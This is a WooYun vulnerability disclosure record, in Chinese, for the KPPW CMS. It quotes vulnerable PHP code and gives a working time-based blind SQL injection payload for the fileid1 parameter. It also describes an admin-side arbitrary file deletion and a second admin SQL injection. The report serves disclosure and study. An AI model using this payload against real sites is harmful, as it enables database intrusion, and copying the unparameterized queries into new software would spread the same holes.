{"id": 84693, "wybug_id": "wooyun-2015-0143678", "wybug_title": "KPPW最新版一处函数七处注入附送后台任意文件删除两枚加注入一枚", "wybug_corp": "keke.com", "wybug_author": "路人甲", "wybug_date": "2015-10-19 12:56", "wybug_open_date": "2016-01-19 09:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-24：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-19：\t细节向公众公开  简要描述： SQL. 详细说明：  问题出现在   \\lib\\sys\\keke_shop_release_class.php 的save_service_obj函数中部分代码如下\npublic function save_service_obj($release_info = array(), $obj_name) {\t\tglobal $kekezu;\t\tif ($release_info ['step1'] == 'step1') {\t\t\tif ($_POST ['fileid1']) {\t\t\t    $fileIdArr = explode('|', $_POST ['fileid1']);\t\t\t    if(is_array($fileIdArr)){\t\t\t        $fileIdStr = implode(',', $fileIdArr);\t\t\t        $filePathArr = db_factory::query('select save_name from '.TABLEPRE.'witkey_file where file_id in ('.$fileIdStr.')');\t\t\t        if($filePathArr){\t\t\t            foreach ($filePathArr as $v) {\t\t\t                $filePathStr.=','.$v['save_name'];\t\t\t            }\t\t\t            $filePathStr = substr($filePathStr, 1);\t\t\t            $pic = kekezu::escape ( $filePathStr );\t\t\t            $release_info ['pic_patch'] = $pic; \t\t\t        }\t\t\t    }else{\t\t\t        $filePathArr = db_factory::get_one('select save_name from '.TABLEPRE.'witkey_file where file_id = '.intval($_POST ['fileid1']));\t\t\t        $filePathStr = $filePathArr['save_name'];\t\t\t        $pic = kekezu::escape ( $filePathStr );\t\t\t        $release_info ['pic_patch'] = $pic; \t\t\t    }\t\t\t}\t\t}\t\tempty ( $release_info ) or $this->_std_obj->_release_info = $release_info; \t\t$_SESSION [$obj_name] = serialize ( $this->_std_obj ); \t}\n\n$filePathArr = db_factory::query('select save_name from '.TABLEPRE.'witkey_file where file_id in ('.$fileIdStr.')');\n此处fileIdStr无单引号保护。往上看依次经过 $fileIdArr = explode('|', $_POST ['fileid1']);$fileIdStr = implode(',', $fileIdArr);得到fileIdStr此处只进行了简单的数组判断和提取传入参数\nfileid1=1) and if(((ascii(substring(user(),1,1)))=114),sleep(10),1);#|\n则$fileIdArr = ('1) and if(((ascii(substring(user(),1,1)))=114),sleep(10),1);#','')$fileIdStr = '1) and if(((ascii(substring(user(),1,1)))=114),sleep(10),1);#'最后拼接的sql即为\nselect save_name from '.TABLEPRE.'witkey_file where file_id in (1) and if(((ascii(substring(user(),1,1)))=114),sleep(10),1);#)\n成功带入查询延时注入看看哪几个地方引用了它：\n\n拿第一个做证明shop\\goods\\control\\pub.php即发布商品，首先登陆，\n\n随便填写信息，提交抓包\n\n直接在fileid1参数后追加要注入的语句\n\n成功执行。其余6点原理相同，再来说说后台的问题函数在  lib\\inc\\CommonClass.php   的delFileBySavename函数\npublic static function delFileBySavename($savename){\t\tif(!$savename){\t\t\treturn false;\t\t}\t\tdb_factory::execute(\"DELETE FROM `\".TABLEPRE.\"witkey_file` WHERE (`save_name`='{$savename}')\");\t\t$filename = S_ROOT.'/'.$savename;\t\tif(file_exists($filename)){\t\t\tunlink($filename);\t\t}\t\treturn true;\t}\n很明显，传入的savename可控即可删除任意文件，来看看引用该函数的地方向上追踪\n\n即lib\\sys\\keke_shop_class.php 的 delServiceFiles函数，部分代码如下：\npublic static function delServiceFiles($service_id,$filename,$type){\t\t$service_info = db_factory::get_one(sprintf(\"select * from %switkey_service where service_id='%d' \",TABLEPRE,intval($service_id)));\t\t$filelist = array();\t\tif($type =='pic'){\t\t\tif($service_info['pic']){\t\t\t\t$filelist = explode(',', $service_info['pic']);\t\t\t}\t\t}else{\t\t\tif($service_info['file_path']){\t\t\t\t$filelist = explode(',', $service_info['file_path']);\t\t\t}\t\t}\t\tif($filelist){\t\t\tCommonClass::delFileBySavename($filename);\t\t\t$newlist = array();\t\t\tforeach ($filelist as $k=>$v){\t\t\t\tif($filename != $v){\t\t\t\t\t$newlist[]=$v;\t\t\t\t}\t\t\t}\t\t}\n同样没有针对$filename进行处理再向上追踪\n\n来看看第一处：\n\n依然没有任何过滤，此处不证明了，虽然可以删除安装lock.毕竟是后台权限。还是比较鸡肋的，第二处同上最后给一个超级明显的后台注入点凑十个问题：auth\\enterprise\\admin\\auth_list.php第18，19行\n$uid=$_GET['uid'];\t\t\t\t$strSql=\"select * from \".TABLEPRE.\"witkey_space where uid=\".$uid;\n太明显，就不证明了。   漏洞证明：  如上。   修复方案：  同在武汉，求请吃饭。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-10-21 09:30 厂商回复： 已处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}